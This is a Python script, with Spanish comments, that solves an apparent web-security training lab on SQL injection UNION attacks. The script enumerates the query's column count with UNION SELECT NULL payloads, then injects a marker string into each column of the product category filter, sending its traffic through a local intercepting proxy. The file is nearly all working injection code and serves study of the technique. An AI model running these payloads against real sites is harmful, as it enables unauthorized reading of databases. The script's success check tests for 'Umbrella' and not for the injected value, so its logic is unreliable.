# Lab: SQL injection UNION attack, finding a column containing text
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
# The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

#variables globales
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxyjp = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
nombre_parametro = "Gifts"
ruta = f"filter?category={nombre_parametro}"

def retorna_cantidad_columnas(url):
    columna = 0
    bandera = True
    while bandera:
        columna += 1
        payload_rcc = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
        Solicitud_rcc = requests.get(url + ruta + payload_rcc, verify=False,proxies=proxyjp)
        respuesta_rcc = Solicitud_rcc.text
        if "UNION SELECT" in respuesta_rcc:
            bandera = False
            return columna
    return None

def Indentifica_columna_con_tipo_dato_texto(url,CantidadColumnas):
    solucionado = False
    for columna in range(1,CantidadColumnas+1):
        if columna == 1:
            payload_icctdt = "' UNION SELECT '6vd795',NULL,NULL--"
        if columna == 2:
            payload_icctdt = "' UNION SELECT NULL,'6vd795',NULL--"
        if columna == 3:
            payload_icctdt = "' UNION SELECT NULL,NULL,'6vd795'--"
        solicitud_icctdt = requests.get(url + ruta + payload_icctdt,verify=False,proxies=proxyjp)
        respuesta_icctdt = solicitud_icctdt.text
        if "Umbrella" in respuesta_icctdt:
            print("[+] Columna tipo texto es: "+ str(columna))
            print("[+] Lab solucionado") 
            solucionado = True    
    if solucionado == False:
        print("[-] No se soluciono el lab")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cantidad_columnas = retorna_cantidad_columnas(url)
        Indentifica_columna_con_tipo_dato_texto(url,cantidad_columnas)
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s https://www.pagina.com" % sys.argv[0])